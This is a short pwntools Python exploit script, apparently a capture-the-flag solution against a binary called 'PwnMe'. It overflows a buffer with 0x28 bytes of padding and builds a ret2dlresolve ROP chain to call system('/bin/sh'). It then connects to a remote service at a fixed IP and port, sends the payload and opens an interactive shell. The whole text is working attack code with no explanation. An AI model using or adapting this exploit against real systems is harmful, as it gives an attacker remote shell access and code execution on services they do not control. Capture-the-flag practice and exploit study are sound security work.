from pwn import *

context.arch = 'amd64'
elf = ELF('./PwnMe')
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
r = remote('106.54.97.9', 10003)
r.recvline()
r.sendline(b'a' * 0x28 + rop.chain())
r.recvline()
r.send(dlresolve.payload)
r.sendline('ls')
r.interactive()
